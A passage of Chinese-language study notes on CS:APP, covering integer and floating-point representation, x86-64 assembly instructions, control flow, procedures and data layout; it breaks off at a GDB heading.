      <tags>
        <tag>编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title>《深入理解计算机系统》学习笔记</title>
    <url>/2022/03/31/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="第二章-信息的表示与处理">第二章 信息的表示与处理</h3>
<h4 id="信息存储">信息存储</h4>
<p>大多数计算机使用<span class="math inline">\(8\)</span>位（bit）的块，称为字节（byte），作为最小的可寻址的内存单位，而不是访问内存中单独的位。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存（virtual memory）。</p>
<p>每台计算机都有一个字长（word size），虚拟地址是以字来编码的，对于一个字长为<span class="math inline">\(w\)</span>位的机器，虚拟地址的范围为<span class="math inline">\(0 ～ 2^w-1\)</span>。所以对于一个<span class="math inline">\(32\)</span>位字长的机器而言，字长限制了虚拟地址的空间为<span class="math inline">\(2^{32}\)</span>，即为<span class="math inline">\(4GB\)</span>。我们知道当代一些程序可能跑起来就需要占用近<span class="math inline">\(10GB\)</span>的内存，显然<span class="math inline">\(32\)</span>位的远古机器是支持不了的。</p>
<p>对于一个<span class="math inline">\(w\)</span>位的整数，其位表示位<span class="math inline">\([x_{w-1}, x_{w-2}, \cdots, x_1, x_0]\)</span>，其中<span class="math inline">\(x_{w-1}\)</span>是最高有效位，<span class="math inline">\(x_0\)</span>是最低有效位。通常<span class="math inline">\(w\)</span>是<span class="math inline">\(8\)</span>的倍数，这些位就能被分组为字节，其中最高有效字节为<span class="math inline">\([x_{w-1},x_{w-2}, \cdots , x_{w-8}]\)</span>，最低有效字节为<span class="math inline">\([x_7, x_6, \cdots, x_0]\)</span>。</p>
<span id="more"></span>
<p>机器存储字节有两种不同的方法：一种称为小端法（little endian），即最低有效字节存储在前，一种称为大端法（big endian），即最高有效字节存储在前。（这两个术语命名的来源在书中有介绍，还挺有趣的，有兴趣的可以翻翻书或自己查一下）。引用书中的例子和图片，考虑0x12345678的存储，两种不同方式的存储如下图所示。对于大部分的计算机，似乎都是采取小端法进行存储。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/little&big_endian.png" alt="little&big_endian"></p>
<h4 id="c语言中的移位运算">C语言中的移位运算</h4>
<h5 id="左移运算">左移运算</h5>
<p>对于一个位表示为<span class="math inline">\([x_{w-1}, x_{w-2}, \cdots, x_0]\)</span>的操作数<span class="math inline">\(x\)</span>，x&lt;&lt;k会得到一个位表示为<span class="math inline">\([x_{w-k-1}, x_{w-k-2}, \cdots, x_0, 0, \cdots, 0]\)</span>的值。</p>
<h5 id="右移运算">右移运算</h5>
<p>分为两种形式：逻辑右移与算术右移，逻辑右移在左端补<span class="math inline">\(k\)</span>个<span class="math inline">\(0\)</span>，而算术右移在左端补<span class="math inline">\(k\)</span>个最高有效位的值。进行运算x&gt;&gt;k，逻辑右移得到结果为<span class="math inline">\([0, \cdots, 0, x_{w-1}, x_{w-2}, \cdots, x_k]\)</span>，算术右移得到结果为<span class="math inline">\([x_{w-1}, \cdots, x_{w-1}, x_{w-1},x_{w-2}, \cdots, x_k]\)</span>。在C语言中，默认对unsigned类型的数进行逻辑右移，对signed类型的数进行算数右移。</p>
<h4 id="整数表示">整数表示</h4>
<p>记位向量<span class="math inline">\(\vec{x} = [x_{w-1}, x_{w-2}, \cdots, x_0]\)</span></p>
<h5 id="无符号数编码">无符号数编码</h5>
<p><span class="math inline">\(B2U_w(\vec{x}) := \sum\limits_{i = 0}^{w-1}x_i 2^i\)</span></p>
<h5 id="补码编码">补码编码</h5>
<p><span class="math inline">\(B2T_w(\vec{x}) := -x_{w-1}2^{w-1} + \sum\limits_{i = 0}^{w-2}x_i 2^i\)</span></p>
<h5 id="有符号数与无符号数之间的转换">有符号数与无符号数之间的转换</h5>
<p>对于C语言来说，只从位级的角度来看，比如有符号数<span class="math inline">\(-1\)</span>的补码表示为0xFFFFFFFF，转化为无符号数会得到<span class="math inline">\(2^{32}-1\)</span>，即C语言在转化时，只是对相同的位表示，采用不用的解释，从而得到有符号或无符号数。从而我们可以定义<span class="math inline">\(T2U_w(x) := B2U_w(T2B_w(x))\)</span>，<span class="math inline">\(U2T_w(x):=B2T_w(U2B_w(x))\)</span></p>
<p>同时我们容易观察到上述函数具有以下性质：</p>
<p><span class="math inline">\(T2U_w(x) = \left\{ \begin{array}{l}x+2^w, &amp; x &lt; 0 \\ x, &amp; x \geq 0 \end{array} \right.\)</span></p>
<p><span class="math inline">\(U2T_w(u) = \left\{ \begin{array}{l}u, &amp; u \leq TMax_w \\ u-2^w, &amp; u &gt; TMax_w \end{array} \right.\)</span></p>
<h5 id="扩展一个数字的位表示">扩展一个数字的位表示</h5>
<p>如果要把字长较长的整数转化为字长较短的，显然在某些情况下是会出现溢出而无法表示的。如果要把字长较短的整数扩展为字长较长的，这总是可以做到的。</p>
<p>对无符号数只需进行零扩展，即将<span class="math inline">\(w\)</span>位的位向量<span class="math inline">\(\vec{u}=[u_{w-1},u_{w-2}, \cdots, u_0]\)</span>扩展为<span class="math inline">\(w&#39;(w&#39; &gt; w)\)</span>位的位向量<span class="math inline">\(\vec{u}&#39; = [0, \cdots, 0, u_{w-1}, u_{w-2}, \cdots, u_0]\)</span></p>
<p>对补码数进行符号扩展，即将<span class="math inline">\(w\)</span>位的位向量<span class="math inline">\(\vec{x}=[x_{w-1},x_{w-2}, \cdots, x_0]\)</span>扩展为<span class="math inline">\(w&#39;(w&#39; &gt; w)\)</span>位的位向量<span class="math inline">\(\vec{x}&#39; = [x_{w-1}, \cdots, x_{w-1}, x_{w-1}, x_{w-2}, \cdots, x_0]\)</span></p>
<p>容易验证对补码数采取符号扩展后，整数值不变。</p>
<h5 id="截断数字">截断数字</h5>
<p>对一个整数做截断时，可能会出现溢出改变它的值。</p>
<p>对无符号数和补码数进行截断的方式相同，即将<span class="math inline">\(w\)</span>位的位向量<span class="math inline">\(\vec{x}=[x_{w-1},x_{w-2}, \cdots, x_0]\)</span>，截断为<span class="math inline">\(k\)</span>位的位向量<span class="math inline">\(\vec{x}&#39; = [x_{k-1},x_{k-2}, \cdots, x_0]\)</span>，之后按照无符号数或补码数的方式，对该<span class="math inline">\(k\)</span>位的位向量进行解释得到对应的整数值。</p>
<h4 id="整数运算">整数运算</h4>
<h5 id="加法">加法</h5>
<p>无符号数加法</p>
<p><span class="math inline">\(x+_w^uy = \left\{ \begin{array}{l} x+y, &amp; x+y &lt; 2^w &amp; Normal \\ x+y-2^w,&amp;2^w \leq x+y &lt; 2^{w+1} &amp; Overflow \end{array} \right.\)</span></p>
<p>无符号数加法逆元</p>
<p><span class="math inline">\(-^u_wx = \left\{ \begin{array}{l}x, &amp; x = 0 \\ 2^w - x, &amp; x &gt; 0 \end{array} \right.\)</span></p>
<p>补码加法</p>
<p><span class="math inline">\(x+_w^ty = \left\{\begin{array}{l}x+y-2^w, &amp; 2^{w-1} \leq x+y &amp; positive\ overflow \\ x+y, &amp; -2^{w-1} \leq x+y &lt; w^{w-1} &amp; normal \\ x+y + 2^w, &amp; x+y &lt; -2^{w-1} &amp; negative \ overflow \end{array} \right.\)</span></p>
<p>补码加法逆元</p>
<p><span class="math inline">\(-_w^tx = \left\{ \begin{array}{l}TMin_w, &amp; x = TMin_w \\ -x, &amp; x &gt; TMin_w \end{array} \right.\)</span></p>
<h5 id="乘法">乘法</h5>
<p>无符号乘法</p>
<p><span class="math inline">\(x*_w^uy = (x \cdot y) mod 2^w\)</span></p>
<p>补码乘法</p>
<p><span class="math inline">\(x*_w^ty = U2T_w((x*_w^u y) mod 2^w)\)</span></p>
<p>把补码位的<span class="math inline">\(1\)</span>视为<span class="math inline">\(-1\)</span>（因为补码位的权重是<span class="math inline">\(-2^{w-1}\)</span>），即可利用乘法竖式的形式进行补码的乘法运算，得到补码乘法结果的二进制表示。</p>
<p>乘除以常数</p>
<p>乘以或除以2的幂可以通过移位得到，同时由于整数乘除法指令比较慢，乘法需要10个甚至更多的时钟周期，除法更是需要30个甚至更多的时钟周期，而加减和移位运算只需要1个时钟周期，因此编译器在编译时，会尝试用移位和加减法运算组合来代替乘除法，如x*14，编译器可以将其替换为(x&lt;&lt;4) - (x&lt;&lt;1)。</p>
<p>在进行右移时，无论正负数都采取向下取整，即7&gt;&gt;1 = 3，-9&gt;&gt;2 = -2，如果希望向上取整，则需要利用一个小trick，通过加上一个偏置来实现，即<span class="math inline">\(\lceil \frac{x}{y} \rceil = \lfloor \frac{x+y-1}{y} \rfloor\)</span></p>
<h4 id="浮点数">浮点数</h4>
<h5 id="ieee浮点数表示">IEEE浮点数表示</h5>
<p>IEEE浮点数标准采用<span class="math inline">\(V = (-1)^s \times 2^E \times M\)</span>的形式来表示一个数。</p>
<p>一个单独的符号位<span class="math inline">\(s\)</span>直接编码符号<span class="math inline">\(s\)</span>，<span class="math inline">\(k\)</span>位阶码字段<span class="math inline">\(exp=e_{k-1}\cdots e_1 e_0\)</span>编码阶码<span class="math inline">\(E\)</span>，<span class="math inline">\(n\)</span>位小数字段<span class="math inline">\(frac = f_{n-1}\cdots f_1 f_0\)</span>编码尾数<span class="math inline">\(M\)</span>。</p>
<p>在C语言里，单精度浮点数（float）的s、exp和frac字段分别为1位、k=8位和n=23位，总共为一个32位的表示；双精度浮点数的s、exp和frac字段分别为1位、k=11位和n=52位，总共为一个64位的表示。</p>
<p>根据exp的值，被编码的值可以分为以下几种情况：</p>
<ol type="1">
<li><p>Normalized Values</p>
<p>当exp不全为1且不全为0时，exp的位按照无符号整数进行解释得到e，e的范围在<span class="math inline">\(1～2^{k}-2\)</span>，通过减去一个偏置（Bias）得到<span class="math inline">\(E\)</span>的值，<span class="math inline">\(Bias = 2^{k-1}-1\)</span>，<span class="math inline">\(E = e-Bias\)</span>，从而<span class="math inline">\(E\)</span>的范围为<span class="math inline">\([-2^{k-1}+2 , 2^{k-1}-1]\)</span>，对于单精度而言是<span class="math inline">\(-126～+127\)</span>，对于双精度而言是<span class="math inline">\(-1022 ～ +1023\)</span>.</p>
<p>小数字段frac被解释为小数值f，其二进制表示为<span class="math inline">\(0.f_{n-1} \cdots f_1 f_0\)</span>，尾数定义为<span class="math inline">\(M = 1+f\)</span>。这种定义方式同样是一种trick，因为我们总是能调整<span class="math inline">\(E\)</span>的值，使得<span class="math inline">\(M\)</span>在范围<span class="math inline">\(1 \leq M &lt; 2\)</span>中，这样<span class="math inline">\(M\)</span>总是能表示为<span class="math inline">\(1.f_{n-1} \cdots f_1 f_0\)</span>，利用这种技巧，我们可以获得一个额外的精度位，而不需要去表示这个<span class="math inline">\(1\)</span>，这表示方式称为implied leading 1.</p></li>
<li><p>Denormalized Values</p>
<p>当exp的位表示全为0时，阶码值为<span class="math inline">\(E = 1-Bias\)</span>，而尾数<span class="math inline">\(M = f\)</span>，通过这种设定，我们能发现浮点数值的增长与二进制位的增长是一致的。不考虑符号位，这种情况下最小的数可以表示0，而在Normalized的情况下显然无法表示0，这种情况的最大数为<span class="math inline">\(00\cdots 0 1 \cdots 1\)</span>，表示<span class="math inline">\(V = 2^{1-(2^{k-1}-1)} \cdot(1-2^{-n})\)</span>，在Normalized的情况下，最小数为<span class="math inline">\(00 \cdots 1 0 \cdots 0\)</span>，此时<span class="math inline">\(V = 2^{1-(2^{k-1}-1)} \cdot (1+0)\)</span>，从而保证了浮点数定义的连续性。</p></li>
<li><p>Special Values</p>
<p>当exp的位表示全为1时，如果frac的位表示全为0，则当<span class="math inline">\(s=0\)</span>时代表<span class="math inline">\(+\infty\)</span>，当<span class="math inline">\(s = 1\)</span>时代表<span class="math inline">\(- \infty\)</span>。如果frac的位表示不全为0，则结果值代表NaN（Not a Number）</p></li>
</ol>
<p>截取书中的图片（一个8位的浮点数表示，1位符号位，4位指数位，3位小数位）作为位表示的例子</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/8bits_expr.png" alt="8bits_expr" style="zoom:50%;" /></p>
<h5 id="舍入">舍入</h5>
<p>常用的4种方式：Round-to-even, Round-toward-zero, Round-down, Round-up</p>
<p>后三种方式容易理解，第一种方式即我们常说的四舍五入，但是要向偶数舍入，即1.5和2.5舍入后都得到2，3.145和3.135舍入后都得到3.14。</p>
<h5 id="浮点运算">浮点运算</h5>
<p>要注意浮点数运算不满足结合律，比如<span class="math inline">\((3.14+1e50)-1e50\)</span>会得到<span class="math inline">\(0\)</span>，但是<span class="math inline">\(3.14+(1e50-1e50)\)</span>会得到<span class="math inline">\(3.14\)</span>，这是由于浮点精度的误差导致的。</p>
<h3 id="第三章-程序的机器级表示">第三章 程序的机器级表示</h3>
<h4 id="程序编码">程序编码</h4>
<p>命令行编译两个文件<code>p1.c</code>, <code>p2.c</code>，使用<code>gcc p1.c p2.c -Og -o p</code>，编译选项<code>-Og</code>会生成符合原始C代码整体结构的机器代码，更高的优化等级可使用<code>-O1</code>, <code>-O2</code>等，但更高的优化等级会使代码严重变形。编译选项<code>-o p</code>生成可执行文件命名为<code>p</code></p>
<p>gcc命令在编码是共有4个步骤。一、C预处理器扩展源代码，插入所有用<code>#include</code>命令指定的文件，扩展所有用<code>#define</code>声明的宏。二、编译器产生两个源文件的汇编代码，名字分别为<code>p1.s</code>和<code>p2.s</code>。三、汇编器会将汇编代码转化成二进制目标代码文件<code>p1.o</code>和<code>p2.o</code>。四、链接器将两个目标代码文件与实现库函数的代码合并，产生最终的可执行文件<code>p</code>。</p>
<p>使用<code>-S</code>选项，就可以得到编译器产生的汇编代码，<code>gcc -Og -S mstore.c</code>即可得到汇编文件<code>mstore.s</code></p>
<p>对于可执行文件，可通过反汇编器将机器代码转化为一种类似汇编代码的格式。可以使用带<code>-d</code>选项的的 OBJDUMP（object dump）程序。<code>objdump -d mstore.o</code></p>
<h4 id="数据格式">数据格式</h4>
<p>参考书中的表格如下</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/sizes_of_C_data_types.png" alt="sizes_of_C_data_types" style="zoom:50%;" /></p>
<p>虽然<code>int</code>和<code>double</code>有相同的后缀，但并不会产生歧义，因为整数和浮点数使用的是一组完全不同的指令和寄存器。</p>
<h4 id="访问信息">访问信息</h4>
<h5 id="整数寄存器">整数寄存器</h5>
<p>首先给出 x86-64架构下的一组16个存储64位值的通用目的寄存器。这些寄存器的演化历史：从最开始的8060中有8个16位寄存器，即%ax到%bp，当扩展到IA32架构时，寄存器扩展为了32位的寄存器，即%eax到%ebp，扩展到x86-64时，原来的8个寄存器扩展为64位，即%rax到%rbp，同时还增加了8个寄存器，命名为%r8到%r15。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/Interger+register.png" alt="Interger+register" style="zoom:50%;" /></p>
<h5 id="获取操作数">获取操作数</h5>
<p>操作数有三种类型。</p>
<p>第一种是立即数 (immediate) ，表示常数值，写法是 '$' 后面跟一个标准C表示法表示的整数。</p>
<p>第二种是寄存器 (register) ，表示读取某个寄存器的内容，根据指令的不同，取寄存器中的低位1字节、2字节、4字节或8字节作为一个操作数。</p>
<p>第三种是内存引用 (memory) ，根据计算出的地址，访问某内存位置的值。最一般的形式为<span class="math inline">\(Imm(r_b, r_i, s)\)</span>，其中<span class="math inline">\(Imm\)</span>为立即数偏移值，<span class="math inline">\(r_b\)</span>为基址寄存器，<span class="math inline">\(r_i\)</span>为变址寄存器，<span class="math inline">\(s\)</span>为比例因子。有效地址计算为<span class="math inline">\(Imm + R[r_b]+R[r_i] \cdot s\)</span>。根据情况可省略其中的某些部分。</p>
<h5 id="数据传送指令">数据传送指令</h5>
<p>最简单的数据传送指令——MOV类，由4条指令组成：<code>movb</code>、<code>movw</code>、<code>movl</code>、<code>movq</code>。他们的区别在于操作的数据大小不同，分别是1、2、4、8字节。指令 <code>MOV S, D</code>表示S是源，D是目标。源操作数可以是立即数、存储在寄存器中或内存中，目标操作数要么是寄存器，要么是内存地址，但是两个操作数不能都是内存地址，即 MOV 类命令不能将一个值直接从一个内存位置复制到另一个内存位置，必须通过寄存器中转。</p>
<p>MOV 指令在更新目标操作数时只会更新指定的寄存器字节或内存位置，唯一的例外是<code>movl</code>在以寄存器为目标时，会把该寄存器的高位4字节都设置为0.给出书中的例子如下。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/mov.png" alt="mov" style="zoom:50%;" /></p>
<p>还有两类数据移动指令，MOVZ 类中的指令会把剩余的高位字节填充为0，MOVS 类会把高位做符号扩展。</p>
<h5 id="压入和弹出栈数据">压入和弹出栈数据</h5>
<p>push操作将数据压入栈中，pop操作将数据弹出栈。在x86-64中，程序栈存放在内存的某个区域。一个寄存器$rsp始终保存着栈顶元素的地址。</p>
<p>对于指令<code>pushq $rbp</code>，相当于<code>subq $8,%rsp</code>与<code>movq %rbp,(%rsp)</code></p>
<p>对于指令<code>popq %rax</code>，相当于<code>movq (%rsp),%rax</code>与<code>addq $8,%rsp</code></p>
<h4 id="算术和逻辑操作">算术和逻辑操作</h4>
<p>如下是各类算术和逻辑操作的类，他们同样对不同字节有不同的形式。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/interger_arith_op.png" alt="interger_arith_op" style="zoom:50%;" /></p>
<p>需要注意的是加载有效地址 (load effective address) 指令<code>leaq</code>，可以用来简洁的做算术运算，如果寄存器%rdx的值为x，那么<code>leaq 7(%rds,%rdx,4),%rax</code>，会将寄存器%rax的值设置为5x+7</p>
<h4 id="控制">控制</h4>
<h5 id="条件码">条件码</h5>
<p>除了整数寄存器，CPU还维护着一组单个位的条件码 (condition code) 寄存器，它们描述了最近的算术或逻辑操作的属性，通过检测这些寄存器来执行条件分支指令，最常用的有：</p>
<p>CF (carry flag) ：进位标志。最近的操作使最高位产生了进位。</p>
<p>ZF (zero flag) ：零标志。最近的操作得到的结果为0。</p>
<p>SF (sign flag) ：符号标志。最近的操作得到的结果为负数。</p>
<p>OF (overflow flag) ：溢出标志。最近的操作导致一个补码的溢出。</p>
<p><code>leaq</code>指令不改变任何条件码。</p>
<p>有两类指令只设置条件码而不改变任何其他寄存器，CMP指令根据两操作数之差来设置条件码，<code>CMP A,B</code>基于<code>B - A</code>进行判断，因此要注意<code>cmp</code>的比较顺序，是后一个比前一个。TEST指令根据两操作数的按位与来设置条件码，<code>TEST A,B</code>基于<code>A &amp; B</code>进行判断。</p>
<h5 id="访问条件码">访问条件码</h5>
<p>一类SET指令根据条件码的组合设置值。具体入下图所示。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/set_instruction.png" alt="set_instruction" style="zoom:50%;" /></p>
<h5 id="跳转指令">跳转指令</h5>
<p>跳转 (jump) 指令会导致执行切换到一个全新的位置，在汇编代码中，这些跳转的目的地通常用一个标号 (label) 表明。如下面的汇编代码序列。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  movq $0, %rax</span><br><span class="line">  jmp .L1</span><br><span class="line">  movq (%rax), %rdx</span><br><span class="line">.L1:</span><br><span class="line">  popq %rdx</span><br></pre></td></tr></table></figure>
<p>程序会跳过<code>movq</code>指令。除了给出标号的直接跳转，程序也可以间接跳转，写法是 '*' 后面跟一个操作数指示符。如<code>jmp *%rax</code>会以%rax中的值作为跳转目标，<code>jmp *(%rax)</code>会以%rax中的值作为地址，读取该地址指向的值。</p>
<p>跳转指令还可以是有条件的，具体如下图所示。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/jump_instruction.png" alt="jump_instruction" style="zoom:50%;" /></p>
<p>跳转指令有几种不同的编码，常用的是PC相对地址 (PC relative) ，地址偏移量可以是1、2或4字节，还有一种是绝对地址，用4字节直接指定跳转目标。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4004d0: 48 89 f8	mov		%rdi,%rax</span><br><span class="line">4004d3: eb 03		jmp		4004d8 &lt;loop+0x8&gt;</span><br><span class="line">4004d5: 48 d1 f8	sar		%rax</span><br><span class="line">4004d8: 48 85 c0	test	%rax,%rax</span><br><span class="line">4004db: 7f f8		jg		4004d5 &lt;loop+0x5&gt;</span><br><span class="line">4004dd: f3 c3		repz retq</span><br></pre></td></tr></table></figure>
<p>绝对地址即<code>jmp</code>指令后显示的地址值，相对地址可以根据编码算出，第2行的<code>jmp</code>对应的偏移值为0x03，故0x4004d5+0x03 = 0x4004d8，同样的，第5行的<code>jg</code>对应的偏移值为0xf8 (即十进制的-8)，故0x4004dd+0xf8 = 0x4004d5，通过偏移值即可算出跳转的地址。</p>
<h5 id="使用条件控制来实现条件分支">使用条件控制来实现条件分支</h5>
<p>使用书本的例子如下。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/conditional_state.png" alt="conditional_state" style="zoom:50%;" /></p>
<h5 id="使用条件传送来实现条件分支">使用条件传送来实现条件分支</h5>
<p>条件传送能够提高代码的并行性，从而提高效率。处理器通过使用流水线 (pipelining) 来获得高性能，在流水线中，一条指令的处理要经过一系列的阶段，每个阶段执行所需操作的一小部分（如，从内存取指令，确定指令类型，从内存读数据，执行算术运算，向内存写数据，更新程序计数器等）。这种方法通过重叠连续指令的步骤来获得高性能，如，取一条指令的同时，执行它前一条指令的算术运算。要做到这一点，要求事先知道需要执行的指令序列，这样才能保证流水线中充满了待执行的指令。但当指令遇到分支时，只有当分支条件的值确定后，才能决定分支往哪走。处理器采用了十分精密的分支预测逻辑来预测跳转的方向，并执行预测结果的指令，但是如果预测错误，处理器就会丢掉当前做的所有工作，重新从正确的位置开始用指令去填充流水线。这将导致程序性能严重下降。</p>
<p>下面给出条件传送的代码示例。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/contional_assignment.png" alt="contional_assignment" style="zoom:50%;" /></p>
<h5 id="循环">循环</h5>
<ol type="1">
<li><p>do-while循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do-while statements</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-<span class="function">statement</span></span><br><span class="line"><span class="function">    <span class="title">while</span><span class="params">(test-expr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// goto statements</span></span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure></li>
<li><p>while循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// while statements</span></span><br><span class="line"><span class="keyword">while</span> (test-expr)</span><br><span class="line">    body-statement</span><br><span class="line"></span><br><span class="line"><span class="comment">// jump to middle</span></span><br><span class="line">    <span class="keyword">goto</span> test;</span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">test:</span><br><span class="line">	t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line"></span><br><span class="line"><span class="comment">// guarded do</span></span><br><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-<span class="function">statement</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(test-expr)</span></span>;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure></li>
<li><p>for循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for statements</span></span><br><span class="line"><span class="keyword">for</span> (init-expr; test-expr; update-expr)</span><br><span class="line">    body-statement</span><br><span class="line"></span><br><span class="line"><span class="comment">// while statements</span></span><br><span class="line">init-expr;</span><br><span class="line"><span class="keyword">while</span> (test-expr) &#123;</span><br><span class="line">    body-statement</span><br><span class="line">    update-expr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jump to middle</span></span><br><span class="line">	init-expr;</span><br><span class="line">	<span class="keyword">goto</span> test;</span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">    update-expr;</span><br><span class="line">test:</span><br><span class="line">	t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line"></span><br><span class="line"><span class="comment">// guarded do</span></span><br><span class="line">	init-expr;</span><br><span class="line">	t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (!t)</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">    update-expr;</span><br><span class="line">	t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="switch语句">switch语句</h5>
<p>switch语句通过使用跳转表 (jump table) 这种数据结构使实现更加高效。gcc会根据分支的数量和开关值的稀疏程度来翻译switch语句，当分支情况较多，且值的范围跨度比较小时，就会使用跳转表。选取书中的例子如下。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/switch_statement.png" alt="switch_statement" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/switch_assembly.png" alt="switch_assembly" style="zoom:50%;" /></p>
<h4 id="进程">进程</h4>
<h5 id="运行时栈">运行时栈</h5>
<p>栈和程序寄存器存放着传递控制和数据、分配内存所需要的信息。当x86-64过程需要的存储空间超过寄存器能够存放的大小时，就会在栈上分配空间。这个部分称为过程的栈帧 (stack fram) 。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/stack_frame_structure.png" alt="stack_frame_structure" style="zoom:50%;" /></p>
<h5 id="转移控制">转移控制</h5>
<p>将控制从P转移到Q只需要简单地把程序计数器 (PC) 设置为Q的代码的起始位置。但当从Q返回P时，处理器必须记录好它需要继续P的执行的代码位置，在x86-64中，这个信息是由指令<code>call Q</code>调用过程Q来记录的。</p>
<h5 id="数据传送">数据传送</h5>
<p>在x86-64中，最多可以通过寄存器传递6个整型（整数和指针）参数。且寄存器的使用是有特殊顺序的，按照%rdi, %rsi, %rdx, %rcx, %r8, %r9进行调用。</p>
<p>如果函数有大于6个整型参数，超出的部分就需要通过栈来传递。第7～n个参数存储在栈中，每个数据的占用地址都向8的倍数对齐，在参数都存储完毕后，再调用<code>call</code>将返回地址压入栈中，并将指令控制转移。</p>
<h5 id="寄存器中的局部存储空间">寄存器中的局部存储空间</h5>
<p>我们要确保一个过程P调用另一个过程Q时，Q的行为不会改变P稍后将要使用的寄存器中的值。为此x86-64采用了一组统一的寄存器使用惯例。</p>
<p>对于寄存器%rbx、%rbp和%r12～%r15中的值，被调用者Q不会修改它们。要么是Q根据不会使用这些寄存器，要么是在使用前，会先将寄存器中的初始值压入栈中，在使用了寄存器，改变了该寄存器的值之后，再从栈中弹出初始值存入寄存器中，从而保证该寄存器的值在返回到P时不变。</p>
<p>对于其余寄存器，除了栈顶指针%rsp，都属于任何过程都可修改的寄存器。</p>
<h4 id="数组分配和访问">数组分配和访问</h4>
<p>通常使用<code>leaq</code>来访问数组元素，设 A 是一个 int 型一维数组，想获取 E[i]，E 的地址存放在寄存器 %rdx 中，而 i 存放在寄存器 %rcx 中，则指令<code>leaq (%rdx, %rcx, 4), %eax</code>即可将 E[i] 存放至 %eax 中。</p>
<p>对二维数组 <code>T D[R][C]</code> 设数据类型 T 的字节大小为 L，则<span class="math inline">\(\&amp;D[i][j] = x_0 + L(C \cdot i + j)\)</span>，其中<span class="math inline">\(x_0\)</span>为数组 D 的首地址。</p>
<h4 id="结构与联合">结构与联合</h4>
<p>结构体分配一片内存空间。要注意的是，许多计算机系统对基本数据类型的合法地址做出了一些限制，通常对一个占用 K 字节的数据类型，要求其起始地址为 K 的倍数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">	占用的内存空间本应该为</span></span><br><span class="line"><span class="comment">   0    4 5    9</span></span><br><span class="line"><span class="comment">    ---- - ----</span></span><br><span class="line"><span class="comment">   |i   |c|j   |</span></span><br><span class="line"><span class="comment">    ---- - ----</span></span><br><span class="line"><span class="comment">    但由于内存对齐，实际上为</span></span><br><span class="line"><span class="comment">   0    4    8    12</span></span><br><span class="line"><span class="comment">    ---- ---- ----</span></span><br><span class="line"><span class="comment">   |i   |c   |j   |</span></span><br><span class="line"><span class="comment">    ---- ---- ----</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>对于联合中定义的多个变量，占用的内存空间为其中最多的一个，每次只是根据调用的值不同，选择不同的解释方式，不改变这段内存空间的二进制表示。因此联合可将一个整数值，按二进制位解释为浮点数，做出转换。如下所示。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">float</span> f;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">i2f</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">tmp</span>;</span></span><br><span class="line">    tmp.a = n;</span><br><span class="line">    <span class="keyword">return</span> tmp.f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用gdb调试">使用GDB调试</h4>
<p>一些GDB的调试命令</p>
